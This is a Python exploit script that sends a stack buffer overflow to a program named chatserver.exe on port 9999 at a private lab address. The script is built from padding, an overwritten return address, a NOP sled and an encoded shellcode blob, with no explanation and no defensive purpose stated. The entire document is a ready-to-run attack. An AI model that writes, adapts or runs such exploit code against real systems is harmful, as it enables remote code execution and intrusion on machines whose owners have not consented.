#!/usr/bin/python
'''Attacking chatserver.exe with bufferoverflow'''

import socket
import sys

ip = '10.10.66.40'
port = 9999
timeout = 5

buffer = 'A' * 2012
buffer += '\xeb\x14\x50\x62'
buffer += '\x90' * 16
buf =  b""
buf =  b""
buf += b"\xbb\x60\xae\xd9\xab\xd9\xe1\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x8a\x52\x3b"
buf += b"\x5e\xb6\x43\x3e\xa1\x46\x94\x5f\x2b\xa3\xa5\x5f\x4f"
buf += b"\xa0\x96\x6f\x1b\xe4\x1a\x1b\x49\x1c\xa8\x69\x46\x13"
buf += b"\x19\xc7\xb0\x1a\x9a\x74\x80\x3d\x18\x87\xd5\x9d\x21"
buf += b"\x48\x28\xdc\x66\xb5\xc1\x8c\x3f\xb1\x74\x20\x4b\x8f"
buf += b"\x44\xcb\x07\x01\xcd\x28\xdf\x20\xfc\xff\x6b\x7b\xde"
buf += b"\xfe\xb8\xf7\x57\x18\xdc\x32\x21\x93\x16\xc8\xb0\x75"
buf += b"\x67\x31\x1e\xb8\x47\xc0\x5e\xfd\x60\x3b\x15\xf7\x92"
buf += b"\xc6\x2e\xcc\xe9\x1c\xba\xd6\x4a\xd6\x1c\x32\x6a\x3b"
buf += b"\xfa\xb1\x60\xf0\x88\x9d\x64\x07\x5c\x96\x91\x8c\x63"
buf += b"\x78\x10\xd6\x47\x5c\x78\x8c\xe6\xc5\x24\x63\x16\x15"
buf += b"\x87\xdc\xb2\x5e\x2a\x08\xcf\x3d\x23\xfd\xe2\xbd\xb3"
buf += b"\x69\x74\xce\x81\x36\x2e\x58\xaa\xbf\xe8\x9f\xcd\x95"
buf += b"\x4d\x0f\x30\x16\xae\x06\xf7\x42\xfe\x30\xde\xea\x95"
buf += b"\xc0\xdf\x3e\x39\x90\x4f\x91\xfa\x40\x30\x41\x93\x8a"
buf += b"\xbf\xbe\x83\xb5\x15\xd7\x2e\x4c\xfe\xd2\xa7\x4f\x2e"
buf += b"\x8a\xb5\x4f\xdf\x17\x33\xa9\xb5\xb7\x15\x62\x22\x21"
buf += b"\x3c\xf8\xd3\xae\xea\x85\xd4\x25\x19\x7a\x9a\xcd\x54"
buf += b"\x68\x4b\x3e\x23\xd2\xda\x41\x99\x7a\x80\xd0\x46\x7a"
buf += b"\xcf\xc8\xd0\x2d\x98\x3f\x29\xbb\x34\x19\x83\xd9\xc4"
buf += b"\xff\xec\x59\x13\x3c\xf2\x60\xd6\x78\xd0\x72\x2e\x80"
buf += b"\x5c\x26\xfe\xd7\x0a\x90\xb8\x81\xfc\x4a\x13\x7d\x57"
buf += b"\x1a\xe2\x4d\x68\x5c\xeb\x9b\x1e\x80\x5a\x72\x67\xbf"
buf += b"\x53\x12\x6f\xb8\x89\x82\x90\x13\x0a\xa2\x72\xb1\x67"
buf += b"\x4b\x2b\x50\xca\x16\xcc\x8f\x09\x2f\x4f\x25\xf2\xd4"
buf += b"\x4f\x4c\xf7\x91\xd7\xbd\x85\x8a\xbd\xc1\x3a\xaa\x97"
string = bytes(buffer, 'latin-1')
string += buf

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        s.send(bytes('nop\r\n', 'latin-1'))
        s.recv(1024)
        s.send(string)
        s.recv(1024)

except Exception as e:
    print(e)
    sys.exit(0)

finally:
    s.close()
